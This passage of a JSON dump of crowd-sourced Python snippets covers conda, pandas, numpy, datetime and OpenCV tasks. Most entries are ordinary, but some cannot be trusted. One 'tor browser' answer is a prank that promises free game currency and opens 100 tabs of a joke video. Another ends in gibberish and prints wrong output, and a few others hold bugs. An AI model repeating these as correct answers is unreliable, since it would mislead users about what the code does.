range(llist2_count):         llist2_item = input()         llist2.insert_node(llist2_item)      result = compare_lists(llist1.head, llist2.head)      print('Result:', result)      '''     Explanation 1:     ----------------------------------------------     Input format:     Number of nodes in LinkedList1: 2     Enter the value to be stored on linkedlist 1:     1     2     Number of nodes in LinkedList2: 2     Enter the value to be stored on linkedlist 2:     1     2     -------------------------------------------------     Output:     Result: Same     --------------------------------------------------     Explanation 2:     ----------------------------------------------     Input format:     Number of nodes in LinkedList1: 2     Enter the value to be stored on linkedlist 1:     1     2     Number of nodes in LinkedList2: 2     Enter the value to be stored on linkedlist 2:     2     1     -------------------------------------------------     Output:     Result: Not Same     --------------------------------------------------     '''\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 538,
    "keyword": null,
    "link": null,
    "title": " compare types in python",
    "description": "obj = \"str\"  isinstance(obj, str) # will return True isinstance(obj, int) # will return False \n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 539,
    "keyword": null,
    "link": null,
    "title": " compile python to pyc",
    "description": "import py_compile py_compile.compile('yourFile.py') # the compiled file will be saved as yourfile.pyc in a __pycache__ folder, which will be created the same folder as yourfile.py\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 540,
    "keyword": null,
    "link": null,
    "title": " complete the function digits(n) that returns how many digits the number has.",
    "description": "def digits(n):   return len(str(n))\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 541,
    "keyword": null,
    "link": null,
    "title": " compute mfcc python",
    "description": "import librosa audio_path = 'audio-path.wav'  x , sr = librosa.load(audio_path)  mfccs = librosa.feature.mfcc(x, sr=sr) print(mfccs.shape) #Displaying  the MFCCs: librosa.display.specshow(mfccs, sr=sr, x_axis='time')\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 542,
    "keyword": null,
    "link": null,
    "title": " compute the determinant of the matrix python",
    "description": "np.linalg.det(b)\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 543,
    "keyword": null,
    "link": null,
    "title": " conda create environment python 3.6",
    "description": "conda create -n myenv python=x.x\nconda create -n yourenvname python=x.x anaconda\nconda create --name myenv #to activate environment: conda activate myenv\nconda create --name myenv \nconda create -n [env-name] python\nconda create -n env_name python=x.x anaconda\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 544,
    "keyword": null,
    "link": null,
    "title": " conda install dash",
    "description": "conda install -c conda-forge dash\npip install dash\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 545,
    "keyword": null,
    "link": null,
    "title": " conda install ffmpeg",
    "description": "conda install -c conda-forge ffmpeg\n",
    "reg_date": "2021-10-12T11:28:24.000Z"
  },
  {
    "id": 546,
    "keyword": null,
    "link": null,
    "title": " conda install lxml",
    "description": "conda install -c anaconda lxml\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 547,
    "keyword": null,
    "link": null,
    "title": " conda install nltk",
    "description": "conda install -c anaconda nltk\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 548,
    "keyword": null,
    "link": null,
    "title": " conda install spacy",
    "description": "conda install -c conda-forge spacy python -m spacy download en_core_web_sm\npip install -U spacy\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 549,
    "keyword": null,
    "link": null,
    "title": " conda python 3.8",
    "description": "conda install -c anaconda python=3.8\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 550,
    "keyword": null,
    "link": null,
    "title": " conda requests",
    "description": "conda install -c anaconda requests\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 551,
    "keyword": null,
    "link": null,
    "title": " conda specify multiple channels",
    "description": "$ conda install scipy --channel conda-forge --channel bioconda \n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 552,
    "keyword": null,
    "link": null,
    "title": " conda tensorflow",
    "description": "conda install -c conda-forge tensorflow\ndon't recomend forge on this one!!!!!  ananaconda: conda install -c anaconda tensorflow  conda-forge: conda install -c conda-forge tensorflow\nconda install -c conda-forge tensorflow=1.14\nconda install tensorflow\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 553,
    "keyword": null,
    "link": null,
    "title": " conda update",
    "description": "# Basic syntax: conda update packagename # To update specific package in the current env conda update --all # To update all packages in the current environment conda update -n myenv --all # To update all packages in myenv environment\nconda update --all \n# If want to update python type conda update python  # To update anaconda type  conda update anaconda  # a) If you want to upgrade between major python version like 3.5 to 3.6, you'll have to do conda install python=$pythonversion$  # b) Method 2 - Create a new environment (Better Method) conda create --name py36 python=3.6  # c) To get the absolute latest python(3.6.5 at time of writing) conda create --name py365 python=3.6.5 --channel conda-forge \nconda update conda \n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 554,
    "keyword": null,
    "link": null,
    "title": " confidence intervals in python",
    "description": "import numpy as np import scipy.stats as st  #define sample data data = [12, 12, 13, 13, 15, 16, 17, 22, 23, 25, 26, 27, 28, 28, 29]  #create 95% confidence interval for population mean weight st.t.interval(alpha=0.95, df=len(data)-1, loc=np.mean(data), scale=st.sem(data))   (16.758, 24.042)\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 555,
    "keyword": null,
    "link": null,
    "title": " configure funCtion in tkinter",
    "description": "root.configure(background='black')\n#Import: from tkinter import *  #Create Window: new_window = Tk() new_window.title(\"Hello World\") new_window.geometry(\"300x250\") #Adding the background color: new_window.config(bg = \"red\")  #new_window tells us that we are setting up something for the new window #.config() means that we want to configure something on the screen #bg tells that the background needs to be changed #\"red\" tells us what should the background color be ; it can also be a hex code  new_window.mainloop()\n",
    "reg_date": "2021-10-12T11:28:25.000Z"
  },
  {
    "id": 556,
    "keyword": null,
    "link": null,
    "title": " confusion matrix python",
    "description": "By definition, entry i,j in a confusion matrix is the number of  observations actually in group i, but predicted to be in group j.  Scikit-Learn provides a confusion_matrix function:  from sklearn.metrics import confusion_matrix y_actu = [2, 0, 2, 2, 0, 1, 1, 2, 2, 0, 1, 2] y_pred = [0, 0, 2, 1, 0, 2, 1, 0, 2, 0, 2, 2] confusion_matrix(y_actu, y_pred) # Output # array([[3, 0, 0], #        [0, 1, 2], #        [2, 1, 3]], dtype=int64)\nfrom sklearn.metrics import confusion_matrix cm = confusion_matrix(y_test, y_predicted) cm # after creating the confusion matrix, for better understaning plot the cm. import seaborn as sn plt.figure(figsize = (10,7)) sn.heatmap(cm, annot=True) plt.xlabel('Predicted') plt.ylabel('Truth')\ndf_confusion = pd.crosstab(y_actu, y_pred, rownames=['Actual'], colnames=['Predicted'], margins=True) \nimport numpy as np  currentDataClass = [1, 3, 3, 2, 5, 5, 3, 2, 1, 4, 3, 2, 1, 1, 2] predictedClass = [1, 2, 3, 4, 2, 3, 3, 2, 1, 2, 3, 1, 5, 1, 1]  def comp_confmat(actual, predicted):      classes = np.unique(actual) # extract the different classes     matrix = np.zeros((len(classes), len(classes))) # initialize the confusion matrix with zeros      for i in range(len(classes)):         for j in range(len(classes)):              matrix[i, j] = np.sum((actual == classes[i]) & (predicted == classes[j]))      return matrix  comp_confmat(currentDataClass, predictedClass)  array([[3., 0., 0., 0., 1.],        [2., 1., 0., 1., 0.],        [0., 1., 3., 0., 0.],        [0., 1., 0., 0., 0.],        [0., 1., 1., 0., 0.]])  \n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 557,
    "keyword": null,
    "link": null,
    "title": " confusion matrix seaborn",
    "description": "import seaborn as sns import matplotlib.pyplot as plt  plt.figure(figsize = (10,7)) sns.heatmap(df_cm, annot=True)\n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 558,
    "keyword": null,
    "link": null,
    "title": " connect to mysql sqlalchemy",
    "description": "# Connecting to mysql database using python sql alchemy app.config['SQLALCHEMY_DATABASE_URI'] = 'mysql+pymysql://<username>:<password>@<host>/<dbname>[?<options>]'\n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 559,
    "keyword": null,
    "link": null,
    "title": " connect with pyodbc with statement",
    "description": "with pyodbc.connect(conx_string) as conx:     cursor = conx.cursor()     cursor.execute(query)     data = cursor.fetchall()     \n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 560,
    "keyword": null,
    "link": null,
    "title": " console clear python",
    "description": "import sys, os  os.system('cls') \nprint('\\033[H\\033[J', end='')\nimport os os.system('clear')\ndef clear():         # for windows      if name == 'nt':          _ = system('cls')         # for mac and linux(here, os.name is 'posix')      else:          _ = system('clear') \n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 561,
    "keyword": null,
    "link": null,
    "title": " constructor python variables",
    "description": "class DemoClass:     num = 101 # default value of self.num when read_number method called      # parameterized constructor     def __init__(self, data):         self.num = data      # a method     def read_number(self):         print(self.num)\n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 562,
    "keyword": null,
    "link": null,
    "title": " continue reading lines until there is no more input python",
    "description": "//For HackerRank and HackerEarth platform below implementation is preferred: while True: try :     line = input()     ... except EOFError:     break;  \n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 563,
    "keyword": null,
    "link": null,
    "title": " control tello drone with python",
    "description": "#To control a trello drone with python you will need djitellopy library  #to do so run this command in the terminal pip install djitellopy\n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 564,
    "keyword": null,
    "link": null,
    "title": " control tor browser with python",
    "description": "#This code will give you free fortnite vbucks import webbrowser  for x in range(100):     webbrowser.open_new_tab(\"https://www.youtube.com/watch?v=dQw4w9WgXcQ&ab_channel=RickAstleyVEVO\"\") \n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 565,
    "keyword": null,
    "link": null,
    "title": " conv 2d tf keras",
    "description": "tf.keras.layers.Conv2D(     filters, kernel_size, strides=(1, 1), padding='valid', data_format=None,     dilation_rate=(1, 1), activation=None, use_bias=True,     kernel_initializer='glorot_uniform', bias_initializer='zeros',     kernel_regularizer=None, bias_regularizer=None, activity_regularizer=None,     kernel_constraint=None, bias_constraint=None, **kwargs )\n",
    "reg_date": "2021-10-12T11:28:26.000Z"
  },
  {
    "id": 566,
    "keyword": null,
    "link": null,
    "title": " convert 2d list to 1d python",
    "description": "import itertools  a = [[1, 2], [3, 4], [5, 6]] list(itertools.chain.from_iterable(a))  Output:- [1, 2, 3, 4, 5, 6]\nimport numpy as np   ini_array1 = np.array([[1, 2, 3], [2, 4, 5], [1, 2, 3]]) result = ini_array1.flatten()\n# Create a 2D Numpy Array. arr = np. array([[0, 1, 2], [3, 4, 5], [6, 7, 8]]) # convert 2D array to a 1D array of size 9. flat_arr = np. reshape(arr, 9) \n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 567,
    "keyword": null,
    "link": null,
    "title": " convert a dictionary into dataframe python",
    "description": "import pandas as pd data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} pd.DataFrame.from_dict(data, orient='index').T\n>>> data = {'col_1': [3, 2, 1, 0], 'col_2': ['a', 'b', 'c', 'd']} >>> pd.DataFrame.from_dict(data)    col_1 col_2 0      3     a 1      2     b 2      1     c 3      0     d \n#Lazy way to convert json dict to df  pd.DataFrame.from_dict(data, orient='index').T\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 568,
    "keyword": null,
    "link": null,
    "title": " convert accented characters to normal python",
    "description": "# Answer written by Eswara Moorthy and edited by Igor Chubin and # Saurabh Bhandari on StackOverflow.com # (https://stackoverflow.com/revisions/44433664/4). # Licenced under CC BY-SA 4.0 # (https://creativecommons.org/licenses/by-sa/4.0/). import unicodedata  def strip_accents(text):      try:         text = unicode(text, 'utf-8')     except NameError: # unicode is a default on python 3          pass      text = unicodedata.normalize('NFD', text)\\            .encode('ascii', 'ignore')\\            .decode(\"utf-8\")     return str(text)   s = strip_accents('&agrave;&eacute;&ecirc;&ouml;hello')  print s\ndef simplify(text): \timport unicodedata \ttry: \t\ttext = unicode(text, 'utf-8') \texcept NameError: \t\tpass \ttext = unicodedata.normalize('NFD', text).encode('ascii', 'ignore').decode(\"utf-8\") \treturn str(text)\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 569,
    "keyword": null,
    "link": null,
    "title": " convert all values in array into float",
    "description": "import numpy as np x = np.array(['1.1', '2.2', '3.3']) y = x.astype(np.float)\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 570,
    "keyword": null,
    "link": null,
    "title": " convert arrary to int",
    "description": ">>> x = np.array([[1.0, 2.3], [1.3, 2.9]]) >>> x array([[ 1. ,  2.3],        [ 1.3,  2.9]]) >>> x.astype(int) array([[1, 2],        [1, 2]]) \n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 571,
    "keyword": null,
    "link": null,
    "title": " convert array to dataframe python",
    "description": "np.random.seed(123) e = np.random.normal(size=10)   dataframe=pd.DataFrame(e, columns=['a'])  print (dataframe)           a 0 -1.085631 1  0.997345 2  0.282978 3 -1.506295 4 -0.578600 5  1.651437 6 -2.426679 7 -0.428913 8  1.265936 9 -0.866740  e_dataframe=pd.DataFrame({'a':e})  print (e_dataframe)           a 0 -1.085631 1  0.997345 2  0.282978 3 -1.506295 4 -0.578600 5  1.651437 6 -2.426679 7 -0.428913 8  1.265936 9 -0.866740\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 572,
    "keyword": null,
    "link": null,
    "title": " convert base64 to image python",
    "description": "import base64 image = open('deer.gif', 'rb') image_read = image.read() image_64_encode = base64.encodestring(image_read) image_64_decode = base64.decodestring(image_64_encode)  image_result = open('deer_decode.gif', 'wb') # create a writable image and write the decoding result image_result.write(image_64_decode) \n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 573,
    "keyword": null,
    "link": null,
    "title": " convert column in pandas to datetime",
    "description": "df['col'] = pd.to_datetime(df['col'])\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 574,
    "keyword": null,
    "link": null,
    "title": " convert column string to int pandas",
    "description": "df['DataFrame Column'] = df['DataFrame Column'].astype(int) \n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 575,
    "keyword": null,
    "link": null,
    "title": " convert column to datetime format python",
    "description": "df['col'] = pd.to_datetime(df['col'])\ndf['Dates'] = pd.to_datetime(df['Dates'], format='%y%m%d')   df['Date'] = df['Date'].astype('datetime64[ns]')  dtype = pd.SparseDtype(np.dtype('datetime64[ns]')) series = pd.Series(df.date, dtype=dtype) df['date']=np.array(series)\n",
    "reg_date": "2021-10-12T11:28:27.000Z"
  },
  {
    "id": 576,
    "keyword": null,
    "link": null,
    "title": " convert column to numeric pandas",
    "description": "df[[column_name]].astype(int)\n# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric)\n# (1) Round to specific decimal places &ndash; Single DataFrame column df['DataFrame column'].round(decimals=number of decimal places needed)  # (2) Round up &ndash; Single DataFrame column df['DataFrame column'].apply(np.ceil)  # (3) Round down &ndash; Single DataFrame column df['DataFrame column'].apply(np.floor)  # (4) Round to specific decimals places &ndash; Entire DataFrame df.round(decimals=number of decimal places needed)\n# convert Series my_series = pd.to_numeric(my_series)  # convert column \"a\" of a DataFrame df[\"a\"] = pd.to_numeric(df[\"a\"]) \n>>> s = pd.Series([\"8\", 6, \"7.5\", 3, \"0.9\"]) # mixed string and numeric values >>> s 0      8 1      6 2    7.5 3      3 4    0.9 dtype: object  >>> pd.to_numeric(s) # convert everything to float values 0    8.0 1    6.0 2    7.5 3    3.0 4    0.9 dtype: float64 \n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 577,
    "keyword": null,
    "link": null,
    "title": " convert dataframe column to float",
    "description": "df[\"col\"] = df[\"col\"].astype(float) \ndf_raw['PricePerSeat_Outdoor'] = pd.to_numeric(df_raw['PricePerSeat_Outdoor'], errors='coerce')\n>>> s = pd.Series([\"8\", 6, \"7.5\", 3, \"0.9\"]) # mixed string and numeric values >>> s 0      8 1      6 2    7.5 3      3 4    0.9 dtype: object  >>> pd.to_numeric(s) # convert everything to float values 0    8.0 1    6.0 2    7.5 3    3.0 4    0.9 dtype: float64 \nYou have four main options for converting types in pandas:  to_numeric() - provides functionality to safely convert non-numeric types (e.g. strings) to a suitable numeric type. (See also to_datetime() and to_timedelta().)  astype() - convert (almost) any type to (almost) any other type (even if it's not necessarily sensible to do so). Also allows you to convert to categorial types (very useful).  infer_objects() - a utility method to convert object columns holding Python objects to a pandas type if possible.  convert_dtypes() - convert DataFrame columns to the \"best possible\" dtype that supports pd.NA (pandas' object to indicate a missing value).  Read on for more detailed explanations and usage of each of these methods.\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 578,
    "keyword": null,
    "link": null,
    "title": " convert dataframe to float",
    "description": "# convert all columns of DataFrame df = df.apply(pd.to_numeric) # convert all columns of DataFrame  # convert just columns \"a\" and \"b\" df[[\"a\", \"b\"]] = df[[\"a\", \"b\"]].apply(pd.to_numeric)\ndf[\"data\"] = df[\"data\"].astype(float) \ndf_raw['PricePerSeat_Outdoor'] = pd.to_numeric(df_raw['PricePerSeat_Outdoor'], errors='coerce')\nYou have four main options for converting types in pandas:  to_numeric() - provides functionality to safely convert non-numeric types (e.g. strings) to a suitable numeric type. (See also to_datetime() and to_timedelta().)  astype() - convert (almost) any type to (almost) any other type (even if it's not necessarily sensible to do so). Also allows you to convert to categorial types (very useful).  infer_objects() - a utility method to convert object columns holding Python objects to a pandas type if possible.  convert_dtypes() - convert DataFrame columns to the \"best possible\" dtype that supports pd.NA (pandas' object to indicate a missing value).  Read on for more detailed explanations and usage of each of these methods.\ndf[df.columns[1:]] = df[df.columns[1:]].replace('[\\$,]', '', regex=True).astype(float)\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 579,
    "keyword": null,
    "link": null,
    "title": " convert date string to date time string python",
    "description": "import datetime  date_time_str = '2018-06-29 08:15:27.243860' date_time_obj = datetime.datetime.strptime(date_time_str, '%Y-%m-%d %H:%M:%S.%f')  print('Date:', date_time_obj.date()) print('Time:', date_time_obj.time()) print('Date-time:', date_time_obj) \nfrom datetime import datetime  datetime_str = '09/19/18 13:55:26'  datetime_object = datetime.strptime(datetime_str, '%m/%d/%y %H:%M:%S')  print(type(datetime_object)) print(datetime_object)  # printed in default format \n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 580,
    "keyword": null,
    "link": null,
    "title": " convert date time to date pandas",
    "description": "df['date_column'] = pd.to_datetime(df['datetime_column']).dt.date \n# Changing object type column to datetime df['date_col'] = pd.to_datetime(df.date_col)  # Creating new column with just the date df['new_date_col'] = df['date_col'].dt.date\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 581,
    "keyword": null,
    "link": null,
    "title": " convert dictionary keys/values to lowercase in python",
    "description": "my_dict = {'KEY1': \"Hello\", 'Key2': \"World\"}  new_dict = dict((k.lower(), v) for k, v in my_dict .items())  print(new_dict\nmy_dict = {'KEY1': \"Hello\", 'Key2': \"World\"}  new_dict = dict((k.upper(), v.upper()) for k, v in my_dict .items())  print(new_dict)\ndef lower_dict(d):    new_dict = dict((k.lower(), v) for k, v in d.items())    return new_dict a = {'Foo': \"Hello\", 'Bar': \"World\"} print(lower_dict(a))\nmy_dict = {'KEY1': \"Hello\", 'Key2': \"World\"}  new_dict = dict((k, v.lower()) for k, v in my_dict .items())  print(new_dict)\ndef lower_dict(d):    new_dict = dict((k.lower(), v.lower()) for k, v in d.items())    return new_dict a = {'Foo': \"Hello\", 'Bar': \"World\"} print(lower_dict(a))\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 582,
    "keyword": null,
    "link": null,
    "title": " convert dtype of column cudf",
    "description": "# convert just columns \"a\" and \"b\" of dataframe(df) df[\"a\",\"b\"] = cudf.to_numeric(df[\"a\",\"b\"])  # convert ALL columns of DataFrame df = cudf.to_numeric(df) # convert all columns of DataFrame,   #dont try `cudf.apply` as it is not supported in cudf API\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 583,
    "keyword": null,
    "link": null,
    "title": " convert epoch to date time in python",
    "description": "datetime_time = datetime.datetime.fromtimestamp(epoch_time)\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 584,
    "keyword": null,
    "link": null,
    "title": " convert float in datetime python",
    "description": "from datetime import datetime  datetime.fromtimestamp(*your_timestamp_here*)#.strftime('%Y-%m-%d') to convert to a formated string\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 585,
    "keyword": null,
    "link": null,
    "title": " convert grayscale to rgb python",
    "description": "backtorgb = cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB)\nimport cv2    image = cv2.imread('C:/Users/N/Desktop/Test.jpg') gray = cv2.cvtColor(image, cv2.COLOR_BGR2GRAY)    cv2.imshow('Original image',image) cv2.imshow('Gray image', gray)    cv2.waitKey(0) cv2.destroyAllWindows() \nfrom PIL import Image img = Image.open('image.png').convert('LA') img.save('greyscale.png')\n",
    "reg_date": "2021-10-12T11:28:28.000Z"
  },
  {
    "id": 586,
    "keyword": null,
    "link": null,
    "title": " convert hex to decimal python",
    "description": "myDecimalInteger = int(\"A278832\", 16) #Converts to decimal from base 16\nx = int(\"deadbeef\", 16) \nprint(int(\"61\", 16)) # output 97 (ascii value \"a\")\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 587,
    "keyword": null,
    "link": null,
    "title": " convert image to grayscale opencv",
    "description": "backtorgb = cv2.cvtColor(gray,cv2.COLOR_GRAY2RGB)\nimg = cv2.imread(path) img_gray = cv2.cvtColor(img, cv2.COLOR_BGR2GRAY)\nimg_gray_mode = cv2.imread(path, cv2.IMREAD_GRAYSCALE)\nimport cv2  # Reading color image as grayscale gray = cv2.imread(\"color-img.png\",0)  # Showing grayscale image cv2.imshow(\"Grayscale Image\", gray)  # waiting for key event cv2.waitKey(0)  # destroying all windows cv2.destroyAllWindows()\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 588,
    "keyword": null,
    "link": null,
    "title": " convert int to binary python",
    "description": "# Python program to convert decimal to binary       # Function to convert Decimal number   # to Binary number   def decimalToBinary(n):       return bin(n).replace(\"0b\", \"\")        # Driver code   if __name__ == '__main__':       print(decimalToBinary(8))       print(decimalToBinary(18))       print(decimalToBinary(7))        Output: 1000 1001\n======= Convert Decimal to Binary in Python ======== my_int = 10; #Method 1: using bin n1 = bin(my_int).replace(\"0b\", \"\")   #1010 or n1 = bin(my_int)[2:]   #Method 2: using format n2 = \"{0:b}\".format(my_int)        or n2 = format(my_int, 'b')        #1010 \ndef convert_to_binary(number:int):     if number == None:         return \"Invalid input\"     elif type(number) == float:         return \"Float is not Handled\"     return format(number, \"010b\")  print(convert_to_binary(None)) print(convert_to_binary(100)) print(convert_to_binary(6.5))\na = 5 #this prints the value of \"a\" in binary print(bin(a))\nprint('{0:b}'.format(3))        # '11' print('{0:8b}'.format(3))       # '      11' print('{0:08b}'.format(3))      # '00000011'  def int2bin(integer, digits):     if integer >= 0:         return bin(integer)[2:].zfill(digits)     else:         return bin(2**digits + integer)[2:] print(int2bin(3, 6))            # '000011'\nghtrs jh iklouy poiu;iou;oi\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 589,
    "keyword": null,
    "link": null,
    "title": " convert integer unix to timestamp python",
    "description": "import datetime print(     datetime.datetime.fromtimestamp(         int(\"1284105682\")     ).strftime('%Y-%m-%d %H:%M:%S') )  \n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 590,
    "keyword": null,
    "link": null,
    "title": " convert into date python",
    "description": "from datetime import datetime  datetime_str = '09/19/18 13:55:26'  datetime_object = datetime.strptime(datetime_str, '%m/%d/%y %H:%M:%S')  print(type(datetime_object)) print(datetime_object)  # printed in default format \ndate_str = '09-19-2018'  date_object = datetime.strptime(date_str, '%m-%d-%Y').date() print(type(date_object)) print(date_object)  # printed in default formatting \n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 591,
    "keyword": null,
    "link": null,
    "title": " convert jupyter notebook to python cmd line",
    "description": "jupyter nbconvert --to script [YOUR_NOTEBOOK].ipynb\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 592,
    "keyword": null,
    "link": null,
    "title": " convert list of int to string python",
    "description": "test_list = list(map(int,test_list))\nintegers = [1, 2, 3, 4] stringed = ''.join(map(str,new)) # stringed = \"1234\"\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 593,
    "keyword": null,
    "link": null,
    "title": " convert list of strings to ints python",
    "description": "test_list = ['1', '4', '3', '6', '7']   int_list = [int(i) for i in test_list]\nUse the map function (in Python 2.x): results = map(int, results)  In Python 3, you will need to convert the result from map to a list: results = list(map(int, results))\n[int(s) for s in example_string.split(',')] \n>>> example_string = '0, 0, 0, 11, 0, 0, 0, 0, 0, 19, 0, 9, 0, 0, 0, 0, 0, 0, 11' >>> list(map(int, example_string.split(',')))  # Python 3, in Python 2 the list() call is redundant [0, 0, 0, 11, 0, 0, 0, 0, 0, 19, 0, 9, 0, 0, 0, 0, 0, 0, 11] >>> [int(s) for s in example_string.split(',')] [0, 0, 0, 11, 0, 0, 0, 0, 0, 19, 0, 9, 0, 0, 0, 0, 0, 0, 11] \n# Example usage using list comprehension: # Say you have the following list of lists of strings and want integers x = [['565.0', '575.0'], ['1215.0', '245.0'], ['1740.0', '245.0']] list_of_integers = [[int(float(j)) for j in i] for i in x]  print(list_of_integers) --> [[565, 575], [1215, 245], [1740, 245]]  # Note, if the strings don't have decimals, you can omit float()\ntest_list = ['1', '4', '3', '6', '7']     # Printing original list  print (\"Original list is : \" + str(test_list))     # using naive method to  # perform conversion  for i in range(0, len(test_list)):      test_list[i] = int(test_list[i])            # Printing modified list   print (\"Modified list is : \" + str(test_list))  \n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 594,
    "keyword": null,
    "link": null,
    "title": " convert list to array python",
    "description": "import numpy as np my_list = [2,4,6,8,10] my_array = np.array(my_list) # printing my_array print my_array # printing the type of my_array print type(my_array)\n# importing library  import numpy      # initilizing list  lst = [1, 7, 0, 6, 2, 5, 6]     # converting list to array  arr = numpy.array(lst)     # displaying list  print (\"List: \", lst)     # displaying array  print (\"Array: \", arr) \n# Basic syntax: numpy.array(list_of_lists)  # Example usage: import numpy as np list_of_lists = [[1, 2, 3], [4, 5, 6]] # Create list of lists your_array = np.array(list_of_lists) # Convert list of lists to array your_array --> array([[1, 2, 3],            [4, 5, 6]])\na = np.array([1, 2]) list(a)\ndef tips_unfold(fn, seed):   def fn_generator(val):     while True:        val = fn(val[1])       if val == False: break       yield val[0]   return [i for i in fn_generator([None, seed])]  f = lambda n: False if n > 50 else [-n, n + 10] print(tips_unfold(f, 10)) \n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 595,
    "keyword": null,
    "link": null,
    "title": " convert list to string",
    "description": "list1 = [1, 2, 3] str1 = ''.join(str(e) for e in list1)\n# Python program to convert a list  # to string using list comprehension      s = ['I', 'want', 4, 'apples', 'and', 18, 'bananas']     # using list comprehension  listToStr = ' '.join([str(elem) for elem in s])     print(listToStr)  \nlist_of_num = [1, 2, 3, 4, 5] # Covert list of integers to a string full_str = ' '.join([str(elem) for elem in list_of_num]) print(full_str)\n>>> L = [1,2,3]        >>> \" \".join(str(x) for x in L) '1 2 3'\nlist1 = ['1', '2', '3'] str1 = ''.join(list1)\nlist1 = ['1', '2', '3']   str1 = ''.join(list1)\n",
    "reg_date": "2021-10-12T11:28:29.000Z"
  },
  {
    "id": 596,
    "keyword": null,
    "link": null,
    "title": " convert list to string python",
    "description": "list1 = [1, 2, 3] str1 = ''.join(str(e) for e in list1)\n# Python program to convert a list  # to string using list comprehension      s = ['I', 'want', 4, 'apples', 'and', 18, 'bananas']     # using list comprehension  listToStr = ' '.join([str(elem) for elem in s])     print(listToStr)  \nlist_of_num = [1, 2, 3, 4, 5] # Covert list of integers to a string full_str = ' '.join([str(elem) for elem in list_of_num]) print(full_str)\nList = [\"ITEM1\", \"ITEM2\", \"ITEM3\"] string_version = \"\".join(List)  print(string_version) \nmy_list = [\"Hello\", 8, \"World\"] string = \" \".join(my_list) print(string) \"\"\" output Hello 8 World \"\"\"\n>>> mylist = ['spam', 'ham', 'eggs'] >>> print ', '.join(mylist) spam, ham, eggs \n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 597,
    "keyword": null,
    "link": null,
    "title": " convert mp3 to wav python",
    "description": "from os import path from pydub import AudioSegment  # files src = input(\"In: \") dst = input(\"Out: \")  # convert mp3 to wav sound = AudioSegment.from_mp3(src) sound.export(dst, format=\"wav\")\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 598,
    "keyword": null,
    "link": null,
    "title": " convert negative to zero in list in python",
    "description": "[max(num, 0) for num in num_list]\n",
    "reg_date": "2021-10-12T11:28:30.000Z"
  },
  {
    "id": 599,
    "keyword": null,
    "link": null,
    "title": " convert number to time python",
